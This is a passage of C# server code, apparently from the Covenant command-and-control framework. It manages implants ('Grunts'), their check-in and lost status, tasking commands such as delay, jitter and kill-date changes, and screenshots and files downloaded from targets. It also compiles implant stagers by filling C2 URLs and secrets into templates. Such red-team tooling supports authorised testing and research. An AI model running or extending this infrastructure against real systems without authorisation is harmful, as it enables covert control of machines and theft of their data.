        public async Task DeleteTheme(int id)
        {
            Theme theme = await this.GetTheme(id);
            _context.Themes.Remove(theme);
            await _notifier.NotifyDeleteTheme(this, id);
            await _context.SaveChangesAsync();
        }
        #endregion

        #region Event Actions
        public async Task<IEnumerable<Event>> GetEvents()
        {
            return await _context.Events.ToListAsync();
        }

        public async Task<Event> GetEvent(int eventId)
        {
            Event anEvent = await _context.Events.FirstOrDefaultAsync(E => E.Id == eventId);
            if (anEvent == null)
            {
                throw new ControllerNotFoundException($"NotFound - Event with id: {eventId}");
            }
            return anEvent;
        }

        public Task<long> GetEventTime()
        {
            return Task.FromResult(DateTime.UtcNow.ToBinary());
        }

        public async Task<IEnumerable<Event>> GetEventsAfter(long fromdate)
        {
            DateTime start = DateTime.FromBinary(fromdate);
            return await _context.Events.Where(E => E.Time.CompareTo(start) >= 0).ToListAsync();
        }

        public async Task<IEnumerable<Event>> GetEventsRange(long fromdate, long todate)
        {
            DateTime start = DateTime.FromBinary(fromdate);
            DateTime end = DateTime.FromBinary(todate);
            return await _context.Events.Where(E => E.Time.CompareTo(start) >= 0 && E.Time.CompareTo(end) <= 0).ToListAsync();
        }

        public async Task<Event> CreateEvent(Event anEvent)
        {
            await _context.Events.AddAsync(anEvent);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateEvent(this, anEvent);
            return await this.GetEvent(anEvent.Id);
        }

        public async Task<IEnumerable<Event>> CreateEvents(params Event[] events)
        {
            await _context.Events.AddRangeAsync(events);
            await _context.SaveChangesAsync();
            return events;
        }

        public async Task<IEnumerable<DownloadEvent>> GetDownloadEvents()
        {
            return await _context.Events.Where(E => E.Type == EventType.Download).Select(E => (DownloadEvent)E).ToListAsync();
        }

        public async Task<DownloadEvent> GetDownloadEvent(int eventId)
        {
            DownloadEvent anEvent = (DownloadEvent)await _context.Events.FirstOrDefaultAsync(E => E.Id == eventId && E.Type == EventType.Download);
            if (anEvent == null)
            {
                throw new ControllerNotFoundException($"NotFound - DownloadEvent with id: {eventId}");
            }
            return anEvent;
        }

        public async Task<string> GetDownloadContent(int eventId)
        {
            DownloadEvent theEvent = await this.GetDownloadEvent(eventId);
            string filename = Path.Combine(Common.CovenantDownloadDirectory, theEvent.FileName);
            if (!File.Exists(filename))
            {
                throw new ControllerBadRequestException($"BadRequest - Path does not exist on disk: {filename}");
            }
            try
            {
                return Convert.ToBase64String(File.ReadAllBytes(filename));
            }
            catch (Exception e)
            {
                throw new ControllerBadRequestException($"BadRequest - Unable to read download content from: {filename}{Environment.NewLine}{e.Message}");
            }
        }

        public async Task<DownloadEvent> CreateDownloadEvent(DownloadEvent downloadEvent)
        {
            downloadEvent.Time = DateTime.UtcNow;
            downloadEvent.WriteToDisk();
            await _context.Events.AddAsync(downloadEvent);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateEvent(this, downloadEvent);
            return await this.GetDownloadEvent(downloadEvent.Id);
        }

        public async Task<IEnumerable<ScreenshotEvent>> GetScreenshotEvents()
        {
            return await _context.Events.Where(E => E.Type == EventType.Screenshot).Select(E => (ScreenshotEvent)E).ToListAsync();
        }

        public async Task<ScreenshotEvent> GetScreenshotEvent(int eventId)
        {
            ScreenshotEvent anEvent = (ScreenshotEvent)await _context.Events.FirstOrDefaultAsync(E => E.Id == eventId && E.Type == EventType.Screenshot);
            if (anEvent == null)
            {
                throw new ControllerNotFoundException($"NotFound - ScreenshotEvent with id: {eventId}");
            }
            return anEvent;
        }

        public async Task<string> GetScreenshotContent(int eventId)
        {
            ScreenshotEvent theEvent = await this.GetScreenshotEvent(eventId);
            string filename = System.IO.Path.Combine(Common.CovenantDownloadDirectory, Utilities.GetSanitizedFilename(theEvent.FileName));
            if (!System.IO.File.Exists(filename))
            {
                throw new ControllerBadRequestException($"BadRequest - Path does not exist on disk: {filename}");
            }
            try
            {
                return Convert.ToBase64String(System.IO.File.ReadAllBytes(filename));
            }
            catch (Exception e)
            {
                throw new ControllerBadRequestException($"BadRequest - Unable to read download content from: {filename}{Environment.NewLine}{e.Message}");
            }
        }

        public async Task<ScreenshotEvent> CreateScreenshotEvent(ScreenshotEvent screenshotEvent)
        {
            screenshotEvent.Time = DateTime.UtcNow;
            screenshotEvent.WriteToDisk();
            await _context.Events.AddAsync(screenshotEvent);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateEvent(this, screenshotEvent);
            return await this.GetScreenshotEvent(screenshotEvent.Id);
        }
        #endregion

        #region ImplantTemplate Actions
        public async Task<IEnumerable<ImplantTemplate>> GetImplantTemplates()
        {
            return await _context.ImplantTemplates
                .Include("ListenerTypeImplantTemplates.ListenerType")
                .ToListAsync();
        }

        public async Task<ImplantTemplate> GetImplantTemplate(int id)
        {
            ImplantTemplate template = await _context.ImplantTemplates
                .Include("ListenerTypeImplantTemplates.ListenerType")
                .FirstOrDefaultAsync(IT => IT.Id == id);
            if (template == null)
            {
                throw new ControllerNotFoundException($"NotFound - ImplantTemplate with id: {id}");
            }
            return template;
        }

        public async Task<ImplantTemplate> GetImplantTemplateByName(string name)
        {
            ImplantTemplate template = await _context.ImplantTemplates
                .Include("ListenerTypeImplantTemplates.ListenerType")
                .FirstOrDefaultAsync(IT => IT.Name == name);
            if (template == null)
            {
                throw new ControllerNotFoundException($"NotFound - ImplantTemplate with Name: {name}");
            }
            return template;
        }

        public async Task<ImplantTemplate> CreateImplantTemplate(ImplantTemplate template)
        {
            List<ListenerType> types = template.CompatibleListenerTypes.ToList();
            template.SetListenerTypeImplantTemplates(new List<ListenerTypeImplantTemplate>());

            await _context.ImplantTemplates.AddAsync(template);
            await _context.SaveChangesAsync();

            foreach (ListenerType type in types)
            {
                await this.CreateEntities(
                    new ListenerTypeImplantTemplate
                    {
                        ListenerType = await this.GetListenerType(type.Id),
                        ImplantTemplate = template
                    }
                );
            }
            await _context.SaveChangesAsync();
            // _notifier.OnCreateImplantTemplate(this, template);
            return await this.GetImplantTemplate(template.Id);
        }

        public async Task<IEnumerable<ImplantTemplate>> CreateImplantTemplates(params ImplantTemplate[] templates)
        {
            List<ImplantTemplate> createdTemplates = new List<ImplantTemplate>();
            foreach (ImplantTemplate template in templates)
            {
                createdTemplates.Add(await this.CreateImplantTemplate(template));
            }
            return createdTemplates;
        }

        public async Task<ImplantTemplate> EditImplantTemplate(ImplantTemplate template)
        {
            ImplantTemplate matchingTemplate = await this.GetImplantTemplate(template.Id);
            matchingTemplate.Name = template.Name;
            matchingTemplate.Description = template.Description;
            matchingTemplate.Language = template.Language;
            matchingTemplate.CommType = template.CommType;
            matchingTemplate.ImplantDirection = template.ImplantDirection;
            matchingTemplate.StagerCode = template.StagerCode;
            matchingTemplate.ExecutorCode = template.ExecutorCode;
            matchingTemplate.CompatibleDotNetVersions = template.CompatibleDotNetVersions;

            IEnumerable<ListenerType> typesToAdd = template.CompatibleListenerTypes.Where(CLT => !matchingTemplate.CompatibleListenerTypes.Select(Two => Two.Id).Contains(CLT.Id));
            IEnumerable<ListenerType> typesToRemove = matchingTemplate.CompatibleListenerTypes.Where(CLT => !template.CompatibleListenerTypes.Select(Two => Two.Id).Contains(CLT.Id));
            foreach (ListenerType type in typesToAdd)
            {
                _context.Add(new ListenerTypeImplantTemplate
                {
                    ImplantTemplateId = matchingTemplate.Id,
                    ListenerTypeId = type.Id
                });
            }
            foreach (ListenerType type in typesToRemove)
            {
                _context.Remove(await _context.FindAsync<ListenerTypeImplantTemplate>(type.Id, matchingTemplate.Id));
            }

            _context.ImplantTemplates.Update(matchingTemplate);
            await _context.SaveChangesAsync();
            // _notifier.OnEditImplantTemplate(this, matchingTemplate);
            return await this.GetImplantTemplate(matchingTemplate.Id);
        }

        public async Task DeleteImplantTemplate(int id)
        {
            ImplantTemplate matchingTemplate = await this.GetImplantTemplate(id);
            _context.ImplantTemplates.Remove(matchingTemplate);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteImplantTemplate(this, matchingTemplate.Id);
        }
        #endregion

        #region Grunt Actions
        public async Task<IEnumerable<Grunt>> GetGrunts()
        {
            List<Grunt> grunts = await _context.Grunts
                .Include(G => G.ImplantTemplate)
                .ToListAsync();
            grunts.ForEach(async G =>
            {
                if (G.Status == GruntStatus.Active || G.Status == GruntStatus.Lost)
                {
                    bool lost = await this.IsGruntLost(G);
                    if (G.Status == GruntStatus.Active && lost)
                    {
                        G.Status = GruntStatus.Lost;
                        await this.EditGrunt(G);
                    }
                    else if (G.Status == GruntStatus.Lost && !lost)
                    {
                        G.Status = GruntStatus.Active;
                        await this.EditGrunt(G);
                    }
                }
            });
            return grunts;
        }

        public async Task<Grunt> GetGrunt(int gruntId)
        {
            Grunt grunt = await _context.Grunts
                .Include(G => G.ImplantTemplate)
                .FirstOrDefaultAsync(G => G.Id == gruntId);
            if (grunt == null)
            {
                throw new ControllerNotFoundException($"NotFound - Grunt with id: {gruntId}");
            }
            if (grunt.Status == GruntStatus.Active || grunt.Status == GruntStatus.Lost)
            {
                bool lost = await this.IsGruntLost(grunt);
                if (grunt.Status == GruntStatus.Active && lost)
                {
                    grunt.Status = GruntStatus.Lost;
                    await this.EditGrunt(grunt);
                }
                else if (grunt.Status == GruntStatus.Lost && !lost)
                {
                    grunt.Status = GruntStatus.Active;
                    await this.EditGrunt(grunt);
                }
            }
            return grunt;
        }

        public async Task<Grunt> GetGruntByName(string name)
        {
            Grunt grunt = await _context.Grunts
                .Include(G => G.ImplantTemplate)
                .FirstOrDefaultAsync(g => g.Name == name);
            if (grunt == null)
            {
                throw new ControllerNotFoundException($"NotFound - Grunt with name: {name}");
            }
            if (grunt.Status == GruntStatus.Active || grunt.Status == GruntStatus.Lost)
            {
                bool lost = await this.IsGruntLost(grunt);
                if (grunt.Status == GruntStatus.Active && lost)
                {
                    grunt.Status = GruntStatus.Lost;
                    await this.EditGrunt(grunt);
                }
                else if (grunt.Status == GruntStatus.Lost && !lost)
                {
                    grunt.Status = GruntStatus.Active;
                    await this.EditGrunt(grunt);
                }
            }
            return grunt;
        }

        public async Task<Grunt> GetGruntByGUID(string guid)
        {
            Grunt grunt = await _context.Grunts
                .Include(G => G.ImplantTemplate)
                .FirstOrDefaultAsync(g => g.GUID == guid);
            if (grunt == null)
            {
                throw new ControllerNotFoundException($"NotFound - Grunt with GUID: {guid}");
            }
            if (grunt.Status == GruntStatus.Active || grunt.Status == GruntStatus.Lost)
            {
                bool lost = await this.IsGruntLost(grunt);
                if (grunt.Status == GruntStatus.Active && lost)
                {
                    grunt.Status = GruntStatus.Lost;
                    await this.EditGrunt(grunt);
                }
                else if (grunt.Status == GruntStatus.Lost && !lost)
                {
                    grunt.Status = GruntStatus.Active;
                    await this.EditGrunt(grunt);
                }
            }
            return grunt;
        }

        public async Task<Grunt> GetGruntByOriginalServerGUID(string serverguid)
        {
            Grunt grunt = await _context.Grunts
                .Include(G => G.ImplantTemplate)
                .FirstOrDefaultAsync(g => g.OriginalServerGuid == serverguid);
            if (grunt == null)
            {
                throw new ControllerNotFoundException($"NotFound - Grunt with OriginalServerGUID: {serverguid}");
            }
            if (grunt.Status == GruntStatus.Active || grunt.Status == GruntStatus.Lost)
            {
                bool lost = await this.IsGruntLost(grunt);
                if (grunt.Status == GruntStatus.Active && lost)
                {
                    grunt.Status = GruntStatus.Lost;
                    await this.EditGrunt(grunt);
                }
                else if (grunt.Status == GruntStatus.Lost && !lost)
                {
                    grunt.Status = GruntStatus.Active;
                    await this.EditGrunt(grunt);
                }
            }
            return grunt;
        }

        public async Task<bool> IsGruntLost(Grunt g)
        {
            DateTime lostTime = g.LastCheckIn;
            int Drift = 10;
            lostTime = lostTime.AddSeconds(g.Delay + (g.Delay * (g.JitterPercent / 100.0)) + Drift);
            if (g.ImplantTemplate.ImplantDirection == ImplantDirection.Pull)
            {
                return DateTime.UtcNow >= lostTime;
            }
            if (DateTime.UtcNow < lostTime)
            {
                return false;
            }

            Grunt sg = await _context.Grunts
                    .Where(GR => GR.Id == g.Id)
                    .Include(GR => GR.GruntCommands)
                    .ThenInclude(GC => GC.GruntTasking)
                    .FirstOrDefaultAsync();
            if (sg != null && sg.GruntCommands != null && sg.GruntCommands.Count > 0)
            {
                GruntCommand lastCommand = sg.GruntCommands
                    .Where(GC => GC.GruntTasking != null)
                    .OrderByDescending(GC => GC.CommandTime)
                    .FirstOrDefault();
                if (lastCommand != null && (lastCommand.GruntTasking.Status == GruntTaskingStatus.Uninitialized || lastCommand.GruntTasking.Status == GruntTaskingStatus.Tasked))
                {
                    lostTime = lastCommand.CommandTime;
                    return DateTime.UtcNow >= lastCommand.CommandTime.AddSeconds(g.Delay + (g.Delay * (g.JitterPercent / 100.0)) + Drift);
                }
            }
            return false;
        }

        public async Task<List<string>> GetPathToChildGrunt(int gruntId, int childId)
        {
            Grunt grunt = await this.GetGrunt(gruntId);
            List<string> path = new List<string>();
            bool found = GetPathToChildGrunt(gruntId, childId, ref path);
            if (!found)
            {
                throw new ControllerNotFoundException($"NotFound - Path from Grunt with id: {gruntId} to Grunt with id: {childId}");
            }
            path.Add(grunt.GUID);
            path.Reverse();
            return path;
        }

        public async Task<Grunt> GetOutboundGrunt(int gruntId)
        {
            Grunt grunt = await this.GetGrunt(gruntId);
            Grunt parent = await _context.Grunts.FirstOrDefaultAsync(G => G.Children.Contains(grunt.GUID));
            while (parent != null)
            {
                grunt = parent;
                parent = await _context.Grunts.FirstOrDefaultAsync(G => G.Children.Contains(grunt.GUID));
            }
            return grunt;
        }

        public async Task<Grunt> CreateGrunt(Grunt grunt)
        {
            TargetIndicator indicator = await _context.Indicators.Where(I => I.Type == IndicatorType.TargetIndicator)
                .Select(T => (TargetIndicator)T)
                .FirstOrDefaultAsync(T => T.ComputerName == grunt.Hostname && T.UserName == grunt.UserDomainName + "\\" + grunt.UserName);
            if (indicator == null && !string.IsNullOrWhiteSpace(grunt.Hostname))
            {
                await _context.Indicators.AddAsync(new TargetIndicator
                {
                    ComputerName = grunt.Hostname,
                    UserName = grunt.UserName,
                });
            }
            grunt.ImplantTemplate = await this.GetImplantTemplate(grunt.ImplantTemplateId);
            await _context.Grunts.AddAsync(grunt);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrunt(this, grunt);
            return await this.GetGrunt(grunt.Id);
        }

        public async Task<IEnumerable<Grunt>> CreateGrunts(params Grunt[] grunts)
        {
            foreach (Grunt g in grunts)
            {
                await this.CreateGrunt(g);
            }
            return grunts;
        }

        public async Task<Grunt> EditGrunt(Grunt grunt, CovenantUser user = null)
        {
            Grunt matching_grunt = await this.GetGrunt(grunt.Id);
            if (matching_grunt.Status != GruntStatus.Active && matching_grunt.Status != GruntStatus.Lost && grunt.Status == GruntStatus.Active)
            {
                if (matching_grunt.Status != GruntStatus.Disconnected)
                {
                    grunt.ActivationTime = DateTime.UtcNow;
                }
                Event gruntEvent = new Event
                {
                    Time = grunt.ActivationTime,
                    MessageHeader = "Grunt Activated",
                    MessageBody = "Grunt: " + grunt.Name + " from: " + grunt.Hostname + " has been activated!",
                    Level = EventLevel.Highlight,
                    Context = "*"
                };
                await _context.Events.AddAsync(gruntEvent);
                await _notifier.NotifyCreateEvent(this, gruntEvent);
            }
            matching_grunt.Name = grunt.Name;
            matching_grunt.GUID = grunt.GUID;
            matching_grunt.OriginalServerGuid = grunt.OriginalServerGuid;

            matching_grunt.ListenerId = grunt.ListenerId;
            matching_grunt.Listener = await this.GetListener(grunt.ListenerId);

            matching_grunt.ImplantTemplateId = grunt.ImplantTemplateId;
            matching_grunt.ImplantTemplate = await this.GetImplantTemplate(grunt.ImplantTemplateId);

            matching_grunt.UserDomainName = grunt.UserDomainName;
            matching_grunt.UserName = grunt.UserName;
            matching_grunt.Status = grunt.Status;
            matching_grunt.Integrity = grunt.Integrity;
            matching_grunt.Process = grunt.Process;
            matching_grunt.LastCheckIn = grunt.LastCheckIn;
            matching_grunt.ActivationTime = grunt.ActivationTime;
            matching_grunt.IPAddress = grunt.IPAddress;
            matching_grunt.Hostname = grunt.Hostname;
            matching_grunt.OperatingSystem = grunt.OperatingSystem;

            matching_grunt.Children = grunt.Children;
            matching_grunt.ValidateCert = grunt.ValidateCert;
            matching_grunt.UseCertPinning = grunt.UseCertPinning;
            matching_grunt.SMBPipeName = grunt.SMBPipeName;
            matching_grunt.Note = grunt.Note;

            if (matching_grunt.Status == grunt.Status && (matching_grunt.Status == GruntStatus.Active || matching_grunt.Status == GruntStatus.Lost))
            {
                if (matching_grunt.ConnectAttempts != grunt.ConnectAttempts)
                {
                    GruntTask setTask = await this.GetGruntTaskByName("Set", matching_grunt.DotNetVersion);
                    setTask.Options[0].Value = "ConnectAttempts";
                    setTask.Options[1].Value = grunt.ConnectAttempts.ToString();
                    GruntCommand createdGruntCommand = await this.CreateGruntCommand(new GruntCommand
                    {
                        Command = "Set ConnectAttempts " + grunt.ConnectAttempts.ToString(),
                        CommandTime = DateTime.UtcNow,
                        User = user,
                        GruntId = grunt.Id,
                        Grunt = grunt,
                        CommandOutputId = 0,
                        CommandOutput = new CommandOutput()
                    });
                    await this.CreateGruntTasking(new GruntTasking
                    {
                        Id = 0,
                        GruntId = grunt.Id,
                        Grunt = grunt,
                        GruntTaskId = setTask.Id,
                        GruntTask = setTask,
                        Status = GruntTaskingStatus.Uninitialized,
                        Type = GruntTaskingType.SetConnectAttempts,
                        Parameters = new List<string> { "ConnectAttempts", grunt.ConnectAttempts.ToString() },
                        GruntCommand = createdGruntCommand,
                        GruntCommandId = createdGruntCommand.Id
                    });
                }
                if (matching_grunt.Delay != grunt.Delay)
                {
                    GruntTask setTask = await this.GetGruntTaskByName("Set", matching_grunt.DotNetVersion);
                    setTask.Options[0].Value = "Delay";
                    setTask.Options[1].Value = grunt.Delay.ToString();
                    GruntCommand createdGruntCommand = await this.CreateGruntCommand(new GruntCommand
                    {
                        Command = "Set Delay " + grunt.Delay.ToString(),
                        CommandTime = DateTime.UtcNow,
                        User = user,
                        GruntId = grunt.Id,
                        Grunt = grunt,
                        CommandOutputId = 0,
                        CommandOutput = new CommandOutput()
                    });
                    await this.CreateGruntTasking(new GruntTasking
                    {
                        Id = 0,
                        GruntId = grunt.Id,
                        Grunt = grunt,
                        GruntTaskId = setTask.Id,
                        GruntTask = setTask,
                        Status = GruntTaskingStatus.Uninitialized,
                        Type = GruntTaskingType.SetDelay,
                        Parameters = new List<string> { "Delay", grunt.Delay.ToString() },
                        GruntCommand = createdGruntCommand,
                        GruntCommandId = createdGruntCommand.Id
                    });
                }
                if (matching_grunt.JitterPercent != grunt.JitterPercent)
                {
                    GruntTask setTask = await this.GetGruntTaskByName("Set", matching_grunt.DotNetVersion);
                    setTask.Options[0].Value = "JitterPercent";
                    setTask.Options[1].Value = grunt.JitterPercent.ToString();
                    GruntCommand createdGruntCommand = await this.CreateGruntCommand(new GruntCommand
                    {
                        Command = "Set JitterPercent " + grunt.JitterPercent.ToString(),
                        CommandTime = DateTime.UtcNow,
                        User = user,
                        GruntId = grunt.Id,
                        Grunt = grunt,
                        CommandOutputId = 0,
                        CommandOutput = new CommandOutput()
                    });
                    await this.CreateGruntTasking(new GruntTasking
                    {
                        Id = 0,
                        GruntId = grunt.Id,
                        Grunt = grunt,
                        GruntTaskId = setTask.Id,
                        GruntTask = setTask,
                        Status = GruntTaskingStatus.Uninitialized,
                        Type = GruntTaskingType.SetJitter,
                        Parameters = new List<string> { "JitterPercent", grunt.JitterPercent.ToString() },
                        GruntCommand = createdGruntCommand,
                        GruntCommandId = createdGruntCommand.Id
                    });
                }
                if (matching_grunt.KillDate != grunt.KillDate)
                {
                    GruntTask setTask = await this.GetGruntTaskByName("Set", matching_grunt.DotNetVersion);
                    setTask.Options[0].Value = "KillDate";
                    setTask.Options[1].Value = grunt.KillDate.ToString();
                    GruntCommand createdGruntCommand = await this.CreateGruntCommand(new GruntCommand
                    {
                        Command = "Set KillDate " + grunt.KillDate.ToString(),
                        CommandTime = DateTime.UtcNow,
                        User = user,
                        GruntId = grunt.Id,
                        Grunt = grunt,
                        CommandOutputId = 0,
                        CommandOutput = new CommandOutput()
                    });
                    await this.CreateGruntTasking(new GruntTasking
                    {
                        Id = 0,
                        GruntId = grunt.Id,
                        Grunt = grunt,
                        GruntTaskId = setTask.Id,
                        GruntTask = setTask,
                        Status = GruntTaskingStatus.Uninitialized,
                        Type = GruntTaskingType.SetKillDate,
                        Parameters = new List<string> { "KillDate", grunt.KillDate.ToString() },
                        GruntCommand = createdGruntCommand,
                        GruntCommandId = createdGruntCommand.Id
                    });
                }
            }

            matching_grunt.DotNetVersion = grunt.DotNetVersion;
            matching_grunt.RuntimeIdentifier = grunt.RuntimeIdentifier;

            matching_grunt.GruntChallenge = grunt.GruntChallenge;
            matching_grunt.GruntNegotiatedSessionKey = grunt.GruntNegotiatedSessionKey;
            matching_grunt.GruntRSAPublicKey = grunt.GruntRSAPublicKey;
            matching_grunt.GruntSharedSecretPassword = grunt.GruntSharedSecretPassword;
            matching_grunt.PowerShellImport = grunt.PowerShellImport;

            TargetIndicator indicator = (await this.GetTargetIndicators())
                .FirstOrDefault(T => T.ComputerName == grunt.Hostname && T.UserName == grunt.UserDomainName + "\\" + grunt.UserName);

            if (indicator == null && !string.IsNullOrWhiteSpace(grunt.Hostname))
            {
                indicator = new TargetIndicator
                {
                    ComputerName = grunt.Hostname,
                    UserName = grunt.UserDomainName + "\\" + grunt.UserName
                };
                await _context.Indicators.AddAsync(indicator);
                // _notifier.OnCreateIndicator(this, indicator);
            }
            _context.Grunts.Update(matching_grunt);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditGrunt(this, matching_grunt);
            return matching_grunt;
        }

        public async Task DeleteGrunt(int gruntId)
        {
            Grunt grunt = await this.GetGrunt(gruntId);
            _context.Grunts.Remove(grunt);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteGrunt(this, grunt.Id);
        }

        public async Task<List<string>> GetCommandSuggestionsForGrunt(Grunt grunt)
        {
            IEnumerable<GruntTasking> taskings = await this.GetGruntTaskingsForGrunt(grunt.Id);
            List<string> suggestions = new List<string>();
            foreach (GruntTask task in await this.GetGruntTasks())
            {
                if (!task.Name.StartsWith("SharpShell-", StringComparison.Ordinal) && task.CompatibleDotNetVersions.Contains(grunt.DotNetVersion))
                {
                    suggestions.Add(task.Name);
                    GetCommandSuggestionsForTaskRecursive(task, 0, task.Name, ref suggestions);
                    foreach (var altname in task.Aliases)
                    {
                        suggestions.Add(altname);
                        GetCommandSuggestionsForTaskRecursive(task, 0, altname, ref suggestions);
                    }
                }
            }
            suggestions.AddRange(new List<string> { "Note" });
            return suggestions;
        }

        private void GetCommandSuggestionsForTaskRecursive(GruntTask task, int index, string progress, ref List<string> suggestions)
        {
            if (index >= task.Options.Count)
            {
                return;
            }
            foreach (var s in task.Options[index].SuggestedValues)
            {
                suggestions.Add(progress + " " + s);
                GetCommandSuggestionsForTaskRecursive(task, index + 1, progress + " " + s, ref suggestions);
            }
        }

        public async Task<byte[]> CompileGruntStagerCode(int id, Launcher launcher)
        {
            Grunt grunt = await this.GetGrunt(id);
            ImplantTemplate template = await this.GetImplantTemplate(grunt.ImplantTemplateId);
            Listener listener = await this.GetListener(grunt.ListenerId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            return CompileGruntCode(template.StagerCode, template, grunt, listener, profile, launcher);
        }

        public async Task<byte[]> CompileGruntExecutorCode(int id, OutputKind outputKind = OutputKind.DynamicallyLinkedLibrary, bool Compress = false)
        {
            Grunt grunt = await this.GetGrunt(id);
            ImplantTemplate template = await this.GetImplantTemplate(grunt.ImplantTemplateId);
            Listener listener = await this.GetListener(grunt.ListenerId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            return CompileGruntCode(template.ExecutorCode, template, grunt, listener, profile, outputKind, Compress, grunt.RuntimeIdentifier);
        }

        private byte[] CompileGruntCode(string CodeTemplate, ImplantTemplate template, Grunt grunt, Listener listener, Profile profile, Launcher launcher)
        {
            return CompileGruntCode(CodeTemplate, template, grunt, listener, profile, launcher.OutputKind, launcher.CompressStager, launcher.RuntimeIdentifier);
        }

        private byte[] CompileGruntCode(string CodeTemplate, ImplantTemplate template, Grunt grunt, Listener listener, Profile profile, OutputKind outputKind = OutputKind.DynamicallyLinkedLibrary, bool Compress = false, Compiler.RuntimeIdentifier runtimeIdentifier = Compiler.RuntimeIdentifier.win_x64)
        {
            byte[] ILBytes = null;
            if (grunt.DotNetVersion == Common.DotNetVersion.Net35 || grunt.DotNetVersion == Common.DotNetVersion.Net40)
            {
                List<Compiler.Reference> references = null;
                switch (grunt.DotNetVersion)
                {
                    case Common.DotNetVersion.Net35:
                        references = Common.DefaultNet35References;
                        break;
                    case Common.DotNetVersion.Net40:
                        references = Common.DefaultNet40References;
                        break;
                }
                ILBytes = Compiler.Compile(new Compiler.CsharpFrameworkCompilationRequest
                {
                    Language = template.Language,
                    Source = this.GruntTemplateReplace(CodeTemplate, template, grunt, listener, profile),
                    TargetDotNetVersion = grunt.DotNetVersion,
                    OutputKind = outputKind,
                    References = references
                });
            }
            else if (grunt.DotNetVersion == Common.DotNetVersion.NetCore31)
            {
                string src = this.GruntTemplateReplace(CodeTemplate, template, grunt, listener, profile);
                string sanitizedName = Utilities.GetSanitizedFilename(template.Name);
                string dir = Common.CovenantDataDirectory + "Grunt" + Path.DirectorySeparatorChar + sanitizedName + Path.DirectorySeparatorChar;
                string ResultName;
                if (template.StagerCode == CodeTemplate)
                {
                    ResultName = sanitizedName + "Stager";
                    dir += sanitizedName + "Stager" + Path.DirectorySeparatorChar;
                    string file = sanitizedName + "Stager" + Utilities.GetExtensionForLanguage(template.Language);
                    File.WriteAllText(dir + file, src);
                }
                else
                {
                    ResultName = sanitizedName;
                    dir += sanitizedName + Path.DirectorySeparatorChar;
                    string file = sanitizedName + Utilities.GetExtensionForLanguage(template.Language);
                    File.WriteAllText(dir + file, src);
                }
                ILBytes = Compiler.Compile(new Compiler.CsharpCoreCompilationRequest
                {
                    ResultName = ResultName,
                    Language = template.Language,
                    TargetDotNetVersion = grunt.DotNetVersion,
                    SourceDirectory = dir,
                    OutputKind = outputKind,
                    RuntimeIdentifier = runtimeIdentifier,
                    UseSubprocess = true
                });
            }
            if (ILBytes == null || ILBytes.Length == 0)
            {
                throw new CovenantCompileGruntStagerFailedException("Compiling Grunt code failed");
            }
            if (Compress)
            {
                ILBytes = Utilities.Compress(ILBytes);
            }
            return ILBytes;
        }

        private string GruntTemplateReplace(string CodeTemplate, ImplantTemplate template, Grunt grunt, Listener listener, Profile profile)
        {
            switch (profile.Type)
            {
                case ProfileType.HTTP:
                    HttpProfile httpProfile = (HttpProfile)profile;
                    HttpListener httpListener = (HttpListener)listener;
                    if (template.CommType == CommunicationType.HTTP)
                    {
                        return CodeTemplate
                            .Replace("// {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}", profile.MessageTransform)
                            .Replace("{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}", this.FormatForVerbatimString(string.Join(",", httpProfile.HttpRequestHeaders.Select(H => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(H.Name))))))
                            .Replace("{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}", this.FormatForVerbatimString(string.Join(",", httpProfile.HttpRequestHeaders.Select(H => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(H.Value))))))
                            .Replace("{{REPLACE_PROFILE_HTTP_URLS}}", this.FormatForVerbatimString(string.Join(",", httpProfile.HttpUrls.Select(H => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(H))))))
                            .Replace("{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}", this.FormatForVerbatimString(httpProfile.HttpGetResponse.Replace("{DATA}", "{0}").Replace("{GUID}", "{1}")))
                            .Replace("{{REPLACE_PROFILE_HTTP_POST_REQUEST}}", this.FormatForVerbatimString(httpProfile.HttpPostRequest.Replace("{DATA}", "{0}").Replace("{GUID}", "{1}")))
                            .Replace("{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}", this.FormatForVerbatimString(httpProfile.HttpPostResponse.Replace("{DATA}", "{0}").Replace("{GUID}", "{1}")))
                            .Replace("{{REPLACE_VALIDATE_CERT}}", grunt.ValidateCert ? "true" : "false")
                            .Replace("{{REPLACE_USE_CERT_PINNING}}", grunt.UseCertPinning ? "true" : "false")
                            .Replace("{{REPLACE_PIPE_NAME}}", grunt.SMBPipeName)
                            .Replace("{{REPLACE_COVENANT_URIS}}", this.FormatForVerbatimString(string.Join(",", httpListener.Urls)))
                            .Replace("{{REPLACE_COVENANT_CERT_HASH}}", this.FormatForVerbatimString(httpListener.UseSSL ? httpListener.SSLCertHash : ""))
                            .Replace("{{REPLACE_GRUNT_GUID}}", this.FormatForVerbatimString(grunt.OriginalServerGuid))
                            .Replace("{{REPLACE_DELAY}}", this.FormatForVerbatimString(grunt.Delay.ToString()))
                            .Replace("{{REPLACE_JITTER_PERCENT}}", this.FormatForVerbatimString(grunt.JitterPercent.ToString()))
                            .Replace("{{REPLACE_CONNECT_ATTEMPTS}}", this.FormatForVerbatimString(grunt.ConnectAttempts.ToString()))
                            .Replace("{{REPLACE_KILL_DATE}}", this.FormatForVerbatimString(grunt.KillDate.ToBinary().ToString()))
                            .Replace("{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}", this.FormatForVerbatimString(grunt.GruntSharedSecretPassword));
                    }
                    else if (template.CommType == CommunicationType.SMB)
                    {
                        return CodeTemplate
                            .Replace("// {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}", profile.MessageTransform)
                            .Replace("{{REPLACE_PROFILE_READ_FORMAT}}", this.FormatForVerbatimString(httpProfile.HttpGetResponse.Replace("{DATA}", "{0}").Replace("{GUID}", "{1}")))
